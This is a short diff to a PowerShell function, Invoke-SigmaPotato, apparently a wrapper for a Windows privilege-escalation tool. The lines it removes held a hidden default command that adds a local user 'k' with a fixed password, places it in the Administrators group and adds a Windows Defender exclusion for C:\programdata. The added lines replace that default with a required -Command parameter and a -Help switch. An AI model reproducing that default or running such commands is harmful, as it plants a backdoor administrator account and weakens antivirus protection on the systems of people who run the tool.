@@ -24,15 +24,14 @@ function Invoke-SigmaPotato {
 # https://github.com/tylerdotrar/PoorMansArmory
 
 
-   [CmdletBinding()]
     Param (
-        [String]
-        $Command = '"net user k kopq@123 /add && net localgroup administrators k /add && powershell Add-MpPreference -ExclusionPath C:\programdata"'
-
+        [string]$Command,
+        [switch]$Help
     )
 
 
-  
+    if ($Help)     { return (Get-Help Invoke-SigmaPotato) }
+    if (!$Command) { return '[-] Must input command to execute.' }
 
 
     # Gzip Compression and Base64 Encoding
